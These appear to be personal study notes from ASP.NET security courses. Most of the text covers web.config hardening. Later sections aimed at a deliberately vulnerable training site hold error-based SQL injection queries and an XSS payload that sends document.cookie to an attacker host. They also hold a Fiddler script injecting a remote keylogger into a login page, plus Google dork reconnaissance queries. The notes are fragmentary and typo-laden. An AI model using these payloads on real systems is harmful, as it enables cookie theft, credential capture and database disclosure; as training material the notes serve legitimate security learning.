======================================================
ASP.NET Security Secrets Revealed

ASP.NET Security Secrets Revealed is all about looking at a broad range of security features within the framework in small bites of easily consumable information.
by Troy Hunt 
======================================================

ASP.Ner Window Form Project
How to Add custom error page:
	In Web.config
	in <system.web>
	 Look for <customErrors>    <!-- it's not there by default -->
e.g.:
    <customErrors mode="On"> </customErrors>
    <customErrors mode="On" defaultRedirect="~/Error.aspx"></customErrors>
	<customErrors mode="On" defaultRedirect="~/Error.aspx"  redirectMode="ResponseRewrite"></customErrors>


---
Session State
   <sessionState mode="InProc" customProvider="DefaultSessionProvider">  // default uses cookie to persist - see shrome developer tools -> resource ->cookie->local host .Net session cookie
   
   <sessionState mode="InProc" customProvider="DefaultSessionProvider" cookieless="UseUri"> //http://localhost:57654/(S(10jivcrv1zllxptl2gsqxvw2))/default   persistance is in the uri

   
   <sessionState mode="InProc" customProvider="DefaultSessionProvider" cookieless="UseCookies" >

---
Tracing is not no by default
in web.config add trace node to system.web


 <system.web>
    <trace enabled="true"/>

	e.g. more secure 
	<trace enabled="false" localOnly="false" />
	
 To see trace in the browser type url: http://localhost:57654/trace.axd
	
---
query string via url
4.5 protects against  url like  http://localhost:57654/?a=<script>

to turn the protect off requires two steps:
 in web.config 
 
  - <httpRuntime targetFramework="4.5" />  to   <httpRuntime targetFramework="4.5" requestValidationMode="2.0" />  //put is back to the 2.0 url validation which does not protect from script injection
 
 
  - <pages>  to  <pages validateRequest="false">
 
Note: There are ways to do this at the page level

---


 in web.config within
 
 <configuration>
 
 add <location with path for the page and within that add <system.web>

  e.g.:
  <location path="Contact">
    <system.web>
      <authorization>
        <allow roles="Admin"/>
		<deny users="*"/>
      </authorization>
    </system.web>
  </location>
  
--- 
turn of http header that contain server version information
 in web.config	set httpRuntime versionHeader =false
	
	e.g.:
	
	  <httpRuntime targetFramework="4.5" requestValidationMode="2.0"  enableVersionHeader="false"/>


---
 globally make a cookies set by the application HttpOnly by default;
 
 in web.config
    <system.web>
    <httpCookies httpOnlyCookies="true"/>
   
   
---
 globally make a cookies set by the application to be only sent over a secure connection by default;

    <httpCookies requireSSL="true"/>

---
machine web.config   

to turn of access to ALL web apps running on the machine to 
	- trace log and 
	- custom error

<system.web>
	<deployment retail="true">

---
maxRequestLength 4 Meg is the default size

 <httpRuntime targetFramework="4.5" requestValidationMode="2.0"  enableVersionHeader="false" maxRequestLength="4096"/>

 
---
to protect against unsafe headers

 <configuration>
  <system.net>
    <settings>
      <httpWebRequest useUnsafeHeaderParsing="false"/>
    </settings>
  </system.net>
  
---
asp viewState - base-64 encoded
no viewstate in mvc

Mac - message authentication code is machine specific
default true;
however may be turned off, on Web farms when when machine keys are not synchronized.

<system.web>
	<pages enableViewStateMac="true" viewStateEncryptionMode="Always">
  
---

MyButton.Text = "<script>alert('Hello World');</script>"; //output encoding for html attributes
MyLabel.Text = "<script>alert('Hello World');</script>"; //not encoded
MyLabel.CssClass = "<script>alert('Hello World');</script>"; // encoded

http://troy.hn/YHiOlA  to see list 
  
  
--
to encrypt connection string in web site 
go to vs command prompt and run as admin/users
cd to version of frame work

e.g.
cd  c:\Windows\Mocrosoft.Net\Framework\v4/0.30319
run command
aspnet_regiis -site "TR5_WebApplication5" -app "/" -pe "connectionStrings"



to decrypt
aspnet_regiis -site "TR5_WebApplication5" -app "/" -pd "connectionStrings"

---
nuget package ELMAH
nuget package NWebSec

---
Asafaweb.com

 ---------------------------------
 -  Membership, Identity and Roles
 ---------------------------------
 Visual Studio 2012 
 ------------------
 
 timeout="2880" is two days and the default setting; change to a sorter period
 
 
    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login" timeout="120" defaultUrl="~/" />
    </authentication>
 
 
     <forms loginUrl="~/Account/Login" timeout="2880" defaultUrl="~/"  requireSSL="false" cookieless="UseCookies" name="myA" />
 
 
  ---------------------------------
 -  Membership, Identity and Roles
 ---------------------------------
 Visual Studio 2012 
 ------------------
 
 to review passwords  . . .
 <membership defaultProvider="DefaultMembershipProvider">
      <providers>
        <add
		
 <roleManager defaultProvider="DefaultRoleProvider">
      <providers>
 
---------------------------------------------------------
---------------------------------------------------------


CA - Certification Authority

SSL certificate pinning

haveibeenpwned.com

OpenID and OAuth


inurl:.asmx filetype:asmx  - search in google; example weather

http://hackyourselffirst.troyhunt.com/robots.txt

http://hackyourselffirst.troyhunt.com/api/admin/users
http://hackyourselffirst.troyhunt.com/help - will show microsoft api help
-----
openIdConnect,Passwordless, Clef
plaintextoffenders.com


ARP Poisoning - Address Resolution Protocol

devices Wi-Fi Pineapple, Throwing star lan tap - packet capture; analyse with wireshark 

Hack Your Own Api
====================================================
----------------------------------------------------
====================================================
hashkiller.com.dic

www.passwordmeter.com
--------------------



Havij Adv. SQL Injection Tool 1.17 Crack [Latest]
Havij, an automatic SQL Injection tool, is distributed by ITSecTeam, an Iranian security company. The name Havij means “carrot”, which is the tool’s icon.

==================
SQL injection


Select * from Widget Where Id=1

Select * from Widget Where Id=1 or 1=1


insert into vote()
values(1. 3. 'Whoa!')'


') select * form sys.tables --

//increment the second top n to get the next table name
//convert(int, name) will always fail - causing error information to be displayed in the http response

//this start disclosing the table names
select convert(int, name) from sys.tables where object_id = (select top 1 object_id from (select top 1 object_id from sys.tables order by object_id) foo order by object_id desc)

//this start disclosing the object_id for a table
//convert(int, varchar(20), object_id + 'a')
//convert(int, varchar(20), object_id %2b 'a')  //+ is http space- change to http plus


//this start disclosing the column names for the table using object_id for a table
select convert(int,name) from sys.columns where column_id = (select top 1 column_id from (select top 1 column_id from sys.columns where object_id = 309576141 order by column_id) foo order by column_id desc) and object_id=309576141





===========================
Fuzz testing tools

-----------------
filetype:config inurl:web.config inurl:ftp

elmah

inurl:elmah.axd "error log for"   put in browser search


http://hackyourselffirst.troyhunt.com/elmah
======

read html source files to see directory paths; or helpful comments
======
robot.txt  -- anything data in file is public; it up to the robots to implement the rules.

==========================
www.shodanhq.com  - type in apache version to find devices running this version, and drill down to your country of interest
---
in browser search apache xx.xxx and vulnerablities will popup
find a version

https://www.apachehaus.com/

-----------------------------
strings ending with '=' are usually base 64 encoding
put text in http://base64decode.org to see the decoded text

----------------
//in chrome tools - resources; select cookies and see which ones are not http only, i.e. means can be accessed from javascript\
//see injection attack, via search query url;  below to access cookies by scripts
http://hackyourselffirst.troyhunt.com/Search?searchTerm=');alert(document.cookie);//



Cookie attributes:
	Domain
	Path
	Expiration
	HTTPOnly
	Secure
	
---------------------
//injection via search example
search term 'enzo/>'

page source code key example lines""
<h2>You searched for &quot;<span id="searchTerm">enzo&#47;</span>&quot;</h2>
$('#searchTerm').val('enzo/>');


$('#searchTerm').val('
'); location.href='http://attacker.hackyourselffirst.troyhunt.com/Cookies/?c='%2BencodeURIComponent(document.cookie);//

');
----
http://hackyourselffirst.troyhunt.com/Search?searchTerm=enzo%2F%3E


http://hackyourselffirst.troyhunt.com/Search?searchTerm='); location.href='http://attacker.hackyourselffirst.troyhunt.com/Cookies/?c='%2BencodeURIComponent(document.cookie);//
  
----


http://attacker.hackyourselffirst.troyhunt.com/
http://hackyourselffirst.troyhunt.com/
------

inurl:elmah.axd "error log for"

-------
always encode output
<script>alert(document.cookies)</script>

cookie httpsflag

----
-- in fiddler script editor -- is an add on in Fiddler 4; injector21 is built into fiddler 4

if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com/") && oSession.PathAndQuery=="/Account/Login"){

//remove any compression or chunking
oSession.utilDecodeResponse();

var oBody = System.Text.Encoding.UTF8.GetSTring(oSession.responseBodyBytes);


// Inject the key logger into the page
oBody = oBody.replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http:/attacker.hackyourselffirst.troyhunt.com/KeyLogger/?k=;</script></body>" );


//Set the response body to the changed body string
oSession.utilSetResponseBody(oBody);
}

------------------------------
Open Web Application Security Project (OWASP)  to 10 attacks and how to mitigate https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013

CWE/SANS TOP 25 Most Dangerous Software Errors https://www.sans.org/top25-software-errors/

Nation Vulnerability Database https://nvd.nist.gov/



PortSwigger Web Security
login
Burp Suite, the leading toolkit for web application security testing

https://portswigger.net/burp/
-----------------------------------------------------------------------------------------------------------
===============================

ASP.NET 3.5 Security

Learn how to secure your ASP.NET Web applications.
by Keith Sparkjoy 
================================
msdn.com/securityguidance